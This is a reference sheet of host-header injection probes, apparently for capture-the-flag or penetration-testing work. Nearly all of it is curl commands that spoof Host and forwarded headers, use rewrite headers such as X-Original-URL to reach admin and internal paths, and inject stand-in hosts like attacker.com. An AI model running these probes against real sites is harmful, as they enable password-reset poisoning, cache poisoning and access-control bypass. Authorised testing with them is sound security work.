# Header dictionary — every host/rewrite/forwarded header, exhaustively

The complete categorized dictionary of host-header probes and payloads.

---

## 1. The host-header probes — the canonical-URL sinks

```bash
# a client-supplied Host — a canonical-URL sink
curl -s -D - -H 'Host: canary.example' "$BASE/robots.txt" | grep -i 'location\|set-cookie'
curl -s -H 'Host: canary.example' "$BASE/page" | grep -o 'canary[^"< ]*'
curl -s -D - -H 'Host: canary.example' "$BASE/reset" | grep -i 'location\|set-cookie'
curl -s -D - -H 'Host: canary.example' "$BASE/login" | grep -i 'set-cookie'
curl -s -D - -H 'Host: canary.example' "$BASE/redirect" | grep -i 'location'
curl -s -D - -H 'Host: canary.example' "$BASE/page" | grep -i 'x-cache\|x-served\|age'
```

## 2. The duplicated Host probes — a parsing differential

```bash
# a duplicated Host — the proxy and the app parse differently
curl -s -D - -H 'Host: good.example' -H 'Host: evil.example' "$BASE/"
curl -s -D - -H 'Host: evil.example' -H 'Host: good.example' "$BASE/"
curl -s -D - -H 'Host: good.example' -H 'Host: target.com' "$BASE/"
curl -s -D - -H 'Host: target.com' -H 'Host: good.example' "$BASE/"
```

## 3. The malformed Host probes — a parsing edge

```bash
# a malformed Host — a parsing edge
curl -s -D - -H 'Host: evil.example:80' "$BASE/"   # a forged port
curl -s -D - -H 'Host: evil.example.' "$BASE/"   # a trailing dot
curl -s -D - -H 'Host: evil.example..target.com' "$BASE/"   # a double-dot
curl -s -D - -H 'Host: ' "$BASE/"   # an empty host
curl -s -D - -H 'Host: evil.example@target.com' "$BASE/"   # an @-separator
curl -s -D - -H 'Host: target.com@evil.example' "$BASE/"   # an @-separator
curl -s -D - -H 'Host: evil.example#target.com' "$BASE/"   # a #-separator
curl -s -D - -H 'Host: target.com#evil.example' "$BASE/"   # a #-separator
curl -s -D - -H 'Host: evil.example?target.com' "$BASE/"   # a ?-separator
curl -s -D - -H 'Host: target.com?evil.example' "$BASE/"   # a ?-separator
curl -s -D - -H 'Host: evil.example/target.com' "$BASE/"   # a path separator
curl -s -D - -H 'Host: target.com/evil.example' "$BASE/"   # a path separator
curl -s -D - -H 'Host: evil.example\\target.com' "$BASE/"   # a backslash separator
curl -s -D - -H 'Host: target.com\\evil.example' "$BASE/"   # a backslash separator
```

## 4. The absolute-URI probes — a request-line differential

```bash
# an absolute-URI Host — a request-line differential
curl -s -D - "$BASE/" --request-target 'http://evil.example/'   # an absolute-URI
curl -s -D - "$BASE/" --request-target 'http://target.com/'   # an absolute-URI
curl -s -D - "http://evil.example/" --resolve 'evil.example:443:127.0.0.1'   # an absolute-URI
curl -s -D - "http://target.com/" --resolve 'target.com:443:127.0.0.1'   # an absolute-URI
```

## 5. The forwarded-header probes — the generated URLs, reset links

```bash
# a client-supplied forwarded header — the app's links rewritten
curl -s -D - -H 'X-Forwarded-Host: canary.example' "$BASE/reset" | grep -i 'location\|set-cookie'
curl -s -H 'X-Forwarded-Host: canary.example' "$BASE/page" | grep -o 'canary[^"< ]*'
curl -s -D - -H 'X-Host: canary.example' "$BASE/reset" | grep -i 'location\|set-cookie'
curl -s -H 'X-Host: canary.example' "$BASE/page" | grep -o 'canary[^"< ]*'
curl -s -D - -H 'X-Forwarded-Server: canary.example' "$BASE/reset" | grep -i 'location\|set-cookie'
curl -s -D - -H 'X-HTTP-Host-Override: canary.example' "$BASE/reset" | grep -i 'location\|set-cookie'
curl -s -D - -H 'X-Forwarded-Proto: http' "$BASE/page" | grep -i 'location\|set-cookie'
curl -s -D - -H 'X-Forwarded-Scheme: http' "$BASE/page" | grep -i 'location\|set-cookie'
curl -s -D - -H 'X-Forwarded-Port: 8080' "$BASE/page" | grep -i 'location\|set-cookie'
curl -s -D - -H 'X-Forwarded-Path: /admin' "$BASE/page" | grep -i 'location\|set-cookie'
curl -s -D - -H 'X-Forwarded-Prefix: /admin' "$BASE/page" | grep -i 'location\|set-cookie'
curl -s -D - -H 'X-Forwarded-User: admin' "$BASE/page" | grep -i 'location\|set-cookie'
curl -s -D - -H 'X-Forwarded-Email: admin@target.com' "$BASE/page" | grep -i 'location\|set-cookie'
```

## 6. The Forwarded probes — the RFC 7239 form

```bash
# a client-supplied Forwarded header — the RFC 7239 form
curl -s -H 'Forwarded: host=canary.example' "$BASE/page" | grep -o 'canary[^"< ]*'
curl -s -H 'Forwarded: for=127.0.0.1;host=canary.example;proto=http' "$BASE/page" | grep -o 'canary[^"< ]*'
curl -s -H 'Forwarded: host=canary.example;for=127.0.0.1' "$BASE/page" | grep -o 'canary[^"< ]*'
curl -s -H 'Forwarded: host=canary.example;proto=http' "$BASE/page" | grep -o 'canary[^"< ]*'
curl -s -H 'Forwarded: for=127.0.0.1;host=canary.example' "$BASE/page" | grep -o 'canary[^"< ]*'
curl -s -H 'Forwarded: for=127.0.0.1;host=canary.example;proto=https' "$BASE/page" | grep -o 'canary[^"< ]*'
```

## 7. The rewrite-header probes — the middleware rewrites

```bash
# a client-supplied rewrite header — the middleware rewrites the path
curl -i "$BASE/admin"                        # expect 403
curl -i -H 'X-Original-URL: /admin' "$BASE/" # 200 with the admin body = finding
curl -i -H 'X-Rewrite-URL: /admin' "$BASE/" # 200 with the admin body = finding
curl -i -H 'X-Forwarded-Path: /admin' "$BASE/" # 200 with the admin body = finding
curl -i -H 'X-Forwarded-Prefix: /admin' "$BASE/" # 200 with the admin body = finding
curl -i -H 'X-Original-Path: /admin' "$BASE/" # 200 with the admin body = finding
curl -i -H 'X-Real-Path: /admin' "$BASE/" # 200 with the admin body = finding
curl -i -H 'X-Original-URL: /internal' "$BASE/" # 200 with the internal body = finding
curl -i -H 'X-Rewrite-URL: /internal' "$BASE/" # 200 with the internal body = finding
curl -i -H 'X-Forwarded-Path: /internal' "$BASE/" # 200 with the internal body = finding
curl -i -H 'X-Forwarded-Prefix: /internal' "$BASE/" # 200 with the internal body = finding
curl -i -H 'X-Original-Path: /internal' "$BASE/" # 200 with the internal body = finding
curl -i -H 'X-Real-Path: /internal' "$BASE/" # 200 with the internal body = finding
curl -i -H 'X-Original-URL: /private' "$BASE/" # 200 with the private body = finding
curl -i -H 'X-Rewrite-URL: /private' "$BASE/" # 200 with the private body = finding
curl -i -H 'X-Forwarded-Path: /private' "$BASE/" # 200 with the private body = finding
curl -i -H 'X-Forwarded-Prefix: /private' "$BASE/" # 200 with the private body = finding
curl -i -H 'X-Original-Path: /private' "$BASE/" # 200 with the private body = finding
curl -i -H 'X-Real-Path: /private' "$BASE/" # 200 with the private body = finding
```

## 8. The multi-header probes — a combined injection

```bash
# a multi-header bypass — a combined injection
curl "$BASE/api/internal" -H 'Host: evil.example' -H 'X-Internal: true'   # a host + an internal
curl "$BASE/api/admin" -H 'Host: evil.example' -H 'X-Admin: true'   # a host + an admin
curl "$BASE/api/user" -H 'Host: evil.example' -H 'X-Forwarded-User: admin'   # a host + a user
curl "$BASE/api/debug" -H 'Host: evil.example' -H 'X-Debug: true'   # a host + a debug
curl "$BASE/api" -H 'X-Forwarded-Host: attacker.com' -H 'X-Forwarded-Proto: http'   # a host + a scheme
curl "$BASE/api" -H 'X-Forwarded-Host: attacker.com' -H 'X-Forwarded-Scheme: http'   # a host + a scheme
curl "$BASE/api" -H 'X-Forwarded-Host: attacker.com' -H 'X-Original-URL: /admin'   # a host + a path
curl "$BASE/api" -H 'X-Forwarded-Host: attacker.com' -H 'X-Forwarded-Path: /admin'   # a host + a path
curl "$BASE/api" -H 'X-Forwarded-Host: attacker.com' -H 'X-Forwarded-Prefix: /admin'   # a host + a prefix
curl "$BASE/api" -H 'Host: evil.example' -H 'X-Forwarded-Host: attacker.com'   # a host + a forwarded host
curl "$BASE/api" -H 'Host: evil.example' -H 'X-Forwarded-Proto: http'   # a host + a scheme
```

## 9. The per-proxy header-map — which headers each proxy adds

```text
nginx      → Host, X-Forwarded-Host, X-Forwarded-Proto, X-Forwarded-Port,
            X-Forwarded-Server, X-Forwarded-User, X-Forwarded-Email
Traefik    → Host, X-Forwarded-Host, X-Forwarded-Proto, X-Forwarded-Port,
            X-Forwarded-Server
Apache     → Host, X-Forwarded-Host, X-Forwarded-Proto, X-Forwarded-Server,
            X-Forwarded-User
HAProxy    → Host, X-Forwarded-Host, X-Forwarded-Proto, X-Forwarded-User
Cloudflare → Host, CF-Connecting-IP, CF-Ray, CF-Visitor, X-Forwarded-For,
            X-Forwarded-Proto
CloudFront → Host, X-Amzn-Trace-Id, X-Forwarded-For, X-Forwarded-Host,
            X-Forwarded-Proto, CloudFront-Viewer-Country
Akamai     → Host, True-Client-IP, Akamai-Origin-Hop, X-Forwarded-For
Varnish    → Host, X-Forwarded-For, X-Forwarded-Host, X-Forwarded-Proto,
            X-Forwarded-Server, X-Forwarded-User
Squid      → Host, X-Forwarded-For
```

## 10. The per-vector map — which vector for which surface

```text
a canonical-URL sink     → a Host / a forwarded host
a reset-link sink        → a forwarded host / a forwarded email
a Location sink          → a Host / a forwarded host
a Set-Cookie sink        → a Host / a forwarded host
a cache-key sink         → a Host / a forwarded host
a rewrite sink           → a rewrite header
a forwarded sink         → a forwarded header
a duplicated sink        → a duplicated Host
a malformed sink         → a malformed Host
an absolute-URI sink     → an absolute-URI Host
a multi-header sink      → a combined injection
a multi-proxy sink       → a chained normalization
```

## 11. The dictionary's falsifier — when the probes are dead

```text
a proxy that validates the Host against a server list → a 400 on a bad
host → a negative result, not a retry signal.
a proxy that strips the client-supplied forwarded header → the header
doesn't reach the app → the bypass fails → a different class.
a proxy that verifies the forwarded header it added → a client-supplied
header is rejected → the bypass fails → a different class.
a trust check that reads a different input → a different class.
```

## 12. The dictionary's budget — the probe limits

```text
5 probes or 15 minutes per mechanism class; 25 probes or 45 minutes
for the challenge. a spent budget → escalate: chain_match → reclassify
→ writeup_search → novel_plan → fanout_sweep → solver_handoff.
```
